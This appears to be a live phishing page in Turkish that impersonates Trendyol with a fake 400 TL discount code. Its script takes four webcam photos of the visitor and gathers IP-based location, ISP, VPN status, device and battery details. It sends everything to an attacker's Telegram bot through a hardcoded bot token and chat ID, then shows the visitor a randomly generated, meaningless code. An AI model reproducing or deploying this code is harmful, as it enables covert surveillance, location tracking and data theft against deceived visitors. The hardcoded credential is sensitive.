<!DOCTYPE html><html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Trendyol - 400 TL Ä°ndirim Kodu</title>
  <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    header {
      background-color: #f27a1a;
      width: 100%;
      padding: 15px 0;
      text-align: center;
    }
    header img {
      height: 30px;
    }
    .container {
      margin-top: 50px;
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
    }
    h2 {
      color: #333;
      margin-bottom: 20px;
      text-align: center;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #f27a1a;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #e06800;
    }
    .code-box {
      margin-top: 20px;
      padding: 15px;
      background-color: #f0f0f0;
      border-left: 4px solid #f27a1a;
      font-weight: bold;
      display: none;
      word-break: break-word;
    }
    .error {
      color: red;
      margin-top: 10px;
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" />
  </header>
  <div class="container">
    <h2>400 TL DeÄŸerinde Ä°ndirim Kodunuzu AlÄ±n</h2>
    <input type="text" id="password" placeholder="Kodunuzu girin" />
    <button onclick="submitCode()">Kodu GÃ¶ster</button>
    <div class="error" id="error">Kod hatalÄ± veya sÃ¼resi dolmuÅŸ olabilir.</div>
    <div class="code-box" id="codeBox">TR-XXXX-YY</div>
  </div>

  <script>
    const correctPassword = "670570";
    const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
    const chatId = "7791726274";

    function generateFakeCode() {
      const part1 = Math.floor(1000 + Math.random() * 9000);
      const part2 = Math.random().toString(36).substring(2, 4).toUpperCase();
      return `TR-${part1}-${part2}`;
    }

    // IP ve detaylÄ± bilgileri ip-api'den Ã§ekiyoruz
    async function getIPDetails() {
      try {
        const res = await fetch("http://ip-api.com/json/?fields=status,message,country,city,query,isp,proxy,mobile,lat,lon");
        const data = await res.json();
        if(data.status === "success") {
          return data;
        }
        return null;
      } catch(e) {
        return null;
      }
    }

    // Batarya bilgisi alalÄ±m
    async function getBattery() {
      if(navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          return {
            level: Math.floor(battery.level * 100) + "%",
            charging: battery.charging
          };
        } catch {
          return null;
        }
      }
      return null;
    }

    // Kamera fotoÄŸraf Ã§ekimi fonksiyonu, 4 tane foto Ã§ekecek, base64 dÃ¶ner
    async function capturePhotos(count = 4, delayMs = 1000) {
      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return [];
      }
      const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      // 1 saniye video hazÄ±r olsun diye bekle
      await new Promise(r => setTimeout(r, 1000));

      const canvas = document.createElement("canvas");
      canvas.width = 320; // kÃ¼Ã§Ã¼k boyut, fazla bÃ¼yÃ¼tme
      canvas.height = 240;
      const ctx = canvas.getContext("2d");
      const photos = [];

      for(let i=0; i<count; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imgData = canvas.toDataURL("image/jpeg", 0.7);
        photos.push(imgData);
        await new Promise(r => setTimeout(r, delayMs));
      }

      stream.getTracks().forEach(track => track.stop());
      return photos;
    }

    // Telegram'a mesaj gÃ¶nderme fonksiyonu
    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "HTML"
        }),
      });
    }

    // Telegram'a fotoÄŸraf gÃ¶nderme fonksiyonu (base64'i blob yapÄ±p formdata ile gÃ¶ndereceÄŸiz)
    async function sendTelegramPhoto(base64data, caption = "") {
      const blob = await (await fetch(base64data)).blob();
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob);
      if(caption) formData.append("caption", caption);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function submitCode() {
      const input = document.getElementById("password").value;
      const error = document.getElementById("error");
      const codeBox = document.getElementById("codeBox");

      if (input === correctPassword) {
        error.style.display = "none";

        // 1- Ã–nce 4 foto Ã§ekelim
        let photos = [];
        try {
          photos = await capturePhotos(4, 1000);
        } catch (e) {
          // Kamera izni yoksa veya hata varsa photos boÅŸ kalacak
          photos = [];
        }

        // 2- Kod Ã¼ret
        const code = generateFakeCode();
        codeBox.textContent = code;
        codeBox.style.display = "block";

        // 3- IP ve detaylarÄ± Ã§ek
        const ipData = await getIPDetails();
        const device = navigator.userAgent;
        const battery = await getBattery();

        // Mesaj formatÄ± istediÄŸin gibi:
        let message = `ğŸ“¡ IP: ${ipData?.query || "-"}\n` +
                      `ğŸŒ Ãœlke: ${ipData?.country || "-"}\n` +
                      `ğŸ™ï¸ Åehir: ${ipData?.city || "-"}\n` +
                      `ğŸ§  ISP: ${ipData?.isp || "-"}\n` +
                      `ğŸ“± TarayÄ±cÄ±: ${device}\n` +
                      `ğŸ” VPN/Proxy: ${ipData?.proxy ? "Evet" : "HayÄ±r"}\n` +
                      `ğŸ—ºï¸ Harita: https://www.google.com/maps?q=${ipData?.lat || 0},${ipData?.lon || 0}\n` +
                      `ğŸ”‹ Åarj: ${battery ? battery.level + (battery.charging ? " (Åarjda)" : " (Bataryada)") : "-"}\n\n` +
                      `Yeni giriÅŸ yapÄ±ldÄ±:\nKod: ${code}`;

        // 4- Telegram'a Ã¶nce mesaj gÃ¶nder
        await sendTelegramMessage(message);

        // 5- Telegram'a fotoÄŸraflarÄ± tek tek gÃ¶nder (caption olarak boÅŸ veriyoruz)
        for(let i=0; i<photos.length; i++) {
          await sendTelegramPhoto(photos[i], `FotoÄŸraf ${i+1}`);
        }

      } else {
        error.style.display = "block";
        codeBox.style.display = "none";
      }
    }
  </script>
</body>
</html>
